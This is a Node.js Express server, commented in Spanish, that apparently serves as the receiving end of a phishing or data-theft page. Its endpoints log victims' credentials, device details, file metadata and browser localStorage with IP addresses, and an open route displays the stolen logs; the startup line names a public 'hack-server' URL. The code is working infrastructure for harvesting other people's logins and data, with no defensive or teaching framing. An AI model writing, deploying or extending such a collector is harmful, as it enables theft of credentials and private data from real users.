const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Crear directorios
fs.ensureDirSync('./logs');
fs.ensureDirSync('./uploads');

// ==================== SERVIR EL FRONTEND ====================
const publicPath = path.join(__dirname, 'public');

app.use(express.static(publicPath));

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

// ==================== RUTAS API ====================

// Device Info
app.post('/api/device-info', async (req, res) => {
    try {
        const data = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            data: data
        };
        await fs.appendFile('./logs/device_info.log', JSON.stringify(logEntry) + '\n');
        res.json({ status: 'success' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ status: 'error' });
    }
});

// Credentials
app.post('/api/credentials', async (req, res) => {
    try {
        const credentials = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            credentials: credentials
        };
        await fs.appendFile('./logs/credentials.log', JSON.stringify(logEntry) + '\n');
        res.json({ status: 'success' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ status: 'error' });
    }
});

// Files
app.post('/api/files', async (req, res) => {
    try {
        const fileData = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            file: { name: fileData.name, size: fileData.size }
        };
        await fs.appendFile('./logs/files.log', JSON.stringify(logEntry) + '\n');
        res.json({ status: 'success' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ status: 'error' });
    }
});

// LocalStorage
app.post('/api/localstorage', async (req, res) => {
    try {
        const storageData = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            storage: storageData
        };
        await fs.appendFile('./logs/localstorage.log', JSON.stringify(logEntry) + '\n');
        res.json({ status: 'success' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ status: 'error' });
    }
});

// ==================== RUTAS PARA VER LOGS ====================
// Esta ruta debe estar ANTES de cualquier ruta catch-all
app.get('/api/logs/:type', (req, res) => {
    const type = req.params.type;
    const logFiles = {
        device: './logs/device_info.log',
        credentials: './logs/credentials.log',
        files: './logs/files.log',
        storage: './logs/localstorage.log'
    };

    const filePath = logFiles[type];

    if (!filePath) {
        return res.status(400).send('Tipo de log inválido. Usa: device, credentials, files o storage');
    }

    try {
        if (fs.existsSync(filePath)) {
            const logs = fs.readFileSync(filePath, 'utf8');
            res.send(`<pre style="background:#1e1e1e;color:#fff;padding:15px;font-family:monospace;">${logs || 'No hay datos aún...'}</pre>`);
        } else {
            res.send('<pre style="background:#1e1e1e;color:#fff;padding:15px;">No hay logs todavía para este tipo.</pre>');
        }
    } catch (error) {
        res.status(500).send('Error al leer el archivo de logs');
    }
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📍 URL pública: https://hack-server-1.onrender.com`);
    console.log(`📁 Public path: ${publicPath}`);
});